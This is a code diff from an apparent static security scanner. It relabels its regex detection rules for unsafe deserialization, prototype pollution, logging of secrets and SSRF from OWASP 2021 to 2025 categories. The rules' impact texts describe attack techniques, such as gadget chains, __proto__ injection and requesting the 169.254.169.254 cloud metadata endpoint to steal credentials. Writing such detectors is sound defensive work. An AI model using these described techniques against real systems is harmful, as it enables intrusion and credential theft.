-      { re: /pickle\.loads?|yaml\.load\s*\((?![^)]*Loader)/, sev: 'high', cwe: 'CWE-502', title: 'Unsafe deserialization (pickle/yaml.load)', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'pickle.loads() and yaml.load() (without SafeLoader) can execute arbitrary code during deserialization. An attacker who can supply a crafted serialized object can achieve remote code execution on the server — this is as dangerous as SQL injection.', ext: f => extMatch(f, ['.py']) },
-      { re: /unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/, sev: 'high', cwe: 'CWE-502', title: 'PHP unserialize() on user input', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'PHP unserialize() on user-controlled data allows attackers to inject serialized PHP objects. With the right "gadget chain" (available in common frameworks), this leads to arbitrary code execution — full server compromise.', ext: f => extMatch(f, ['.php']) },
-      { re: /JSON\.parse\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'info', cwe: 'CWE-502', title: 'JSON.parse on user input — verify no prototype pollution', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'JSON.parse is generally safe from deserialization attacks, but the resulting object should not be merged into prototypes. Check for Object.assign() or spread operators that could enable prototype pollution leading to denial of service or privilege escalation.', ext: ALL },
-      { re: /(?:\.extend|Object\.assign|merge|_.merge|\.defaultsDeep)\s*\([^)]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-1321', title: 'Prototype pollution — user input merged into objects', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'User input is merged into application objects. Attackers can inject __proto__ or constructor.prototype properties to pollute the global object prototype, affecting all objects in the application. This can lead to property injection, authentication bypass, or remote code execution.', ext: ALL },
+      // ── A08:2025 — Software or Data Integrity Failures ──
+      { re: /pickle\.loads?|yaml\.load\s*\((?![^)]*Loader)/, sev: 'high', cwe: 'CWE-502', title: 'Unsafe deserialization (pickle/yaml.load)', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'pickle.loads() and yaml.load() (without SafeLoader) can execute arbitrary code during deserialization. An attacker who can supply a crafted serialized object can achieve remote code execution on the server — this is as dangerous as SQL injection.', ext: f => extMatch(f, ['.py']) },
+      { re: /unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/, sev: 'high', cwe: 'CWE-502', title: 'PHP unserialize() on user input', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'PHP unserialize() on user-controlled data allows attackers to inject serialized PHP objects. With the right "gadget chain" (available in common frameworks), this leads to arbitrary code execution — full server compromise.', ext: f => extMatch(f, ['.php']) },
+      { re: /JSON\.parse\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'info', cwe: 'CWE-502', title: 'JSON.parse on user input — verify no prototype pollution', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'JSON.parse is generally safe from deserialization attacks, but the resulting object should not be merged into prototypes. Check for Object.assign() or spread operators that could enable prototype pollution leading to denial of service or privilege escalation.', ext: ALL },
+      { re: /(?:\.extend|Object\.assign|merge|_.merge|\.defaultsDeep)\s*\([^)]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-1321', title: 'Prototype pollution — user input merged into objects', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'User input is merged into application objects. Attackers can inject __proto__ or constructor.prototype properties to pollute the global object prototype, affecting all objects in the application. This can lead to property injection, authentication bypass, or remote code execution.', ext: ALL },
 
-      // ── A09:2021 — Security Logging and Monitoring Failures ──
-      { re: /console\.(?:log|error|warn|info|debug)\s*\([^)]*(?:password|secret|token|key|credential|api[_-]?key)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data logged to console', owasp: 'A09:2021-Security Logging and Monitoring Failures', impact: 'Passwords, tokens, or secrets are being written to console logs. Production logs are often stored in files, aggregated to logging services, or visible in container/cloud logs — anyone with log access can see these credentials.', ext: ALL },
-      { re: /(?:logger|log)\.(?:info|debug|error|warn)\s*\([^)]*(?:password|secret|token|key|credential)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data written to application logs', owasp: 'A09:2021-Security Logging and Monitoring Failures', impact: 'Credentials or secrets are being written to application logs. Logs are often accessible to developers, stored in plaintext, and may be shipped to third-party services — exposing credentials to anyone with log access.', ext: ALL },
+      // ── A09:2025 — Security Logging and Alerting Failures ──
+      { re: /console\.(?:log|error|warn|info|debug)\s*\([^)]*(?:password|secret|token|key|credential|api[_-]?key)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data logged to console', owasp: 'A09:2025-Security Logging and Alerting Failures', impact: 'Passwords, tokens, or secrets are being written to console logs. Production logs are often stored in files, aggregated to logging services, or visible in container/cloud logs — anyone with log access can see these credentials.', ext: ALL },
+      { re: /(?:logger|log)\.(?:info|debug|error|warn)\s*\([^)]*(?:password|secret|token|key|credential)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data written to application logs', owasp: 'A09:2025-Security Logging and Alerting Failures', impact: 'Credentials or secrets are being written to application logs. Logs are often accessible to developers, stored in plaintext, and may be shipped to third-party services — exposing credentials to anyone with log access.', ext: ALL },
 
-      // ── A10:2021 — Server-Side Request Forgery (SSRF) ──
-      { re: /fetch\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The server makes HTTP requests to URLs provided by the user. Attackers can make the server request internal services (e.g., http://169.254.169.254/latest/meta-data/ on AWS to steal cloud credentials), scan internal networks, or attack internal APIs.', ext: ALL },
-      { re: /axios\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The server makes outbound HTTP requests to user-supplied URLs. Attackers can access internal cloud metadata services (AWS/GCP/Azure), hit internal admin panels, or scan the internal network behind the firewall.', ext: ALL },
-      { re: /(?:urllib|requests|httpx|http\.client|got|superagent|needle|node-fetch)\s*\.\s*(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — HTTP client with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The application makes HTTP requests to URLs from user input. Attackers can access internal services, cloud metadata endpoints, or attack internal infrastructure that is not exposed to the internet.', ext: ALL },
-      { re: /(?:import\s+urllib|from\s+urllib|import\s+requests|require\s*\(\s*['"]https?['"]\s*\)|require\s*\(\s*['"]axios['"]\s*\))/, sev: 'info', cwe: 'CWE-918', title: 'HTTP client library imported — check for SSRF', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'An HTTP client library is imported. If any URL passed to it comes from user input without validation, attackers can make the server request internal services, steal cloud credentials, or attack internal infrastructure.', ext: ALL },
+      // ── A05:2025 — Injection (SSRF) ──
+      { re: /fetch\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The server makes HTTP requests to URLs provided by the user. Attackers can make the server request internal services (e.g., http://169.254.169.254/latest/meta-data/ on AWS to steal cloud credentials), scan internal networks, or attack internal APIs.', ext: ALL },
+      { re: /axios\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The server makes outbound HTTP requests to user-supplied URLs. Attackers can access internal cloud metadata services (AWS/GCP/Azure), hit internal admin panels, or scan the internal network behind the firewall.', ext: ALL },
+      { re: /(?:urllib|requests|httpx|http\.client|got|superagent|needle|node-fetch)\s*\.\s*(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — HTTP client with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The application makes HTTP requests to URLs from user input. Attackers can access internal services, cloud metadata endpoints, or attack internal infrastructure that is not exposed to the internet.', ext: ALL },
+      { re: /(?:import\s+urllib|from\s+urllib|import\s+requests|require\s*\(\s*['"]https?['"]\s*\)|require\s*\(\s*['"]axios['"]\s*\))/, sev: 'info', cwe: 'CWE-918', title: 'HTTP client library imported — check for SSRF', owasp: 'A05:2025-Injection', impact: 'An HTTP client library is imported. If any URL passed to it comes from user input without validation, attackers can make the server request internal services, steal cloud credentials, or attack internal infrastructure.', ext: ALL },
     ]
     const findings = []
     for (const f of files) {
@@ -1904,7 +1915,7 @@ function extractFindingsFromOutput(tool, output, target = '') {
           `SQL Injection — ${lines[i].trim().slice(0, 140)}`,
           'critical',
           ctx.slice(0, 400),
-          { cweId: 'CWE-89', owaspCategory: 'A03:2021-Injection' }
+          { cweId: 'CWE-89', owaspCategory: 'A05:2025-Injection' }
         )
       }
     }
